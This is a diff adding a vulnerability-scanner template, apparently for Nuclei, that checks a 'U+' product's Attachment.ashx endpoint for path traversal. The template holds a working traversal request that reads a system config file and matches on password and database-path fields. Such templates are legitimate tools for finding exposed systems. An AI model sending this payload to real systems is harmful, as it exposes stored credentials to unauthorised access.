@@ -1,0 +1,27 @@
+id: uplus-Attachment-PathTravel
+
+info:
+  name: U+ Attachment PathTravel
+  author: iSee857
+  severity: high
+  description: |
+    U+ Attachment PathTravel
+
+http:
+  - raw:
+      - |
+        GET /Controllers/ajax/Attachment.ashx?attachmentUrl=../../config/sysconfig_zts.fig HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'sysconfig_zt'
+          - 'ZTPwd'
+          - 'DBPath'
+        condition: and
+
+      - type: status
+        status:
+          - 200
